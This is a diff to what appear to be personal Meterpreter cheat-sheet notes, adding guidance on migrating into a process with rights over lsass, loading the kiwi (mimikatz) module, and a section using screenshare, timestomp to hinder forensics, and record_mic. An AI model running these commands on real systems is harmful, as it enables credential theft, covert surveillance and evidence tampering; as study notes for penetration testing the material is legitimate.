@@ -5,11 +5,21 @@ getuid
 sysinfo
 
 # Migrate to a process
-ps ;; generally most stable processes are explorer.exe or spoolsv.exe
+ps ;; generally most stable processes are explorer.exe, service.exe or spoolsv.exe
+;; Prior to further action, we need to move to a process that actually
+;; has the permissions that we need to interact with the lsass service,
+;; the service responsible for authentication within Windows.
+;; In order to interact with lsass we need to be 'living in' a process that
+;; is the same architecture as the lsass service (x64 in the case of this
+;; machine) and a process that has the same permissions as lsass.
 migrate <PID>
+;; or
+migrate -n <name_of_process>
 
 # Load a module (e.g., modern mimikatz)
 load kiwi
+;; run help to show the module commands
+help
 
 # Execute a file
 execute -f /path/to/file
@@ -60,3 +70,8 @@ hashdump  ;; remember that on windows these hashes are of the format "NT" (i.e.,
 # Get a powershell shell
 load powersell
 powershell_shell
+
+# Post-Exploitation Coolness
+screenshare
+timestomp   ;;To complicate forensics efforts we can modify timestamps of files on the system
+record_mic
